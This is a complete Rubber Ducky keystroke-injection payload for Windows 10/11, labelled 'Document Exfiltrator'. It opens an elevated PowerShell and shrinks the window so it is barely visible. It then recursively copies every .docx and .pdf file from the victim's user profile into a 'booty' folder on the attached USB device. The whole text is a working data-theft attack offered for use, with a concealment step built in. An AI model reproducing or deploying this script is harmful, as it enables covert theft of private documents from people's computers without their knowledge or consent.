REM Title: Document Exfiltrator to 'booty' Folder with Dynamic Drive Detection
REM Author: Skycritch
REM Description: Searches for .docx and .pdf files on the target system and copies them to a folder named 'booty' on the Rubber Ducky drive.
REM Target: Windows 10/11
REM Version: 1.3
REM Category: Exfiltration

ATTACKMODE HID STORAGE
DEFAULT_DELAY 2000

DELAY 3000
REM Open PowerShell in minimized mode
GUI r
DELAY 500
STRING powershell
CTRL-SHIFT ENTER
DELAY 500
ALT s
DELAY 1000

REM *** Hide PowerShell ***
STRINGLN [console]::WindowHeight=10
STRINGLN [console]::WindowWidth=10
ALT SPACE
STRING m
LEFTARROW
REPEAT 70
STRINGLN [console]::WindowHeight=5
STRINGLN [console]::WindowWidth=5
ALT SPACE
STRING m
LEFTARROW
REPEAT 50
STRINGLN [console]::WindowHeight=1
STRINGLN [console]::WindowWidth=1

REM Find the DUCKY drive letter and save it to a variable
STRING $DuckyDrive = Get-WmiObject Win32_Volume | Where-Object { $_.Label -eq 'DUCKY' } | Select-Object -ExpandProperty DriveLetter
ENTER
DELAY 1000

REM Check if the DUCKY drive exists
STRING if (-Not $DuckyDrive) { exit }
ENTER
DELAY 500

REM Define the booty folder and create it if it doesn't exist
STRING $BootyFolder = "$DuckyDrive\booty"
ENTER
DELAY 500
STRING if (-Not (Test-Path -Path $BootyFolder)) { New-Item -Path $BootyFolder -ItemType Directory }
ENTER
DELAY 1000

REM Search for .docx and .pdf files and copy them to the 'booty' folder
STRING Get-ChildItem -Path $env:USERPROFILE -Include *.docx, *.pdf -File -Recurse | ForEach-Object {
ENTER
DELAY 500
STRING     $FilePath = $_.FullName
ENTER
DELAY 500
STRING     $FileName = $_.Name
ENTER
DELAY 500
STRING     Copy-Item -Path $FilePath -Destination "$BootyFolder\$FileName" -Force
ENTER
DELAY 500
STRING }
ENTER
DELAY 1000


REM Close PowerShell
STRINGLN exit
